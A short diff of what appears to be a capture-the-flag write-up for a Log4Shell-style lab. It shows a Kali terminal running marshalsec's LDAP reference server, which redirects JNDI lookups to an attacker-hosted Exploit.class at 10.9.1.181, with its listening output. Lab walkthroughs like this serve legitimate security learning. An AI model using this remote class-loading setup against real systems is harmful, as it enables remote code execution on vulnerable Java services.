@@ -6,8 +6,11 @@ the exploitation vectors and affected Java runtime versions:
 
 ┌──(kali㉿kali)-[~/thm/solar/marshalsec]
 └─$ java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.9.1.181:8000/#Exploit"
+
 Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+
 Listening on 0.0.0.0:1389
+
 Send LDAP reference result for Exploit redirecting to http://10.9.1.181:8000/Exploit.class
 
 
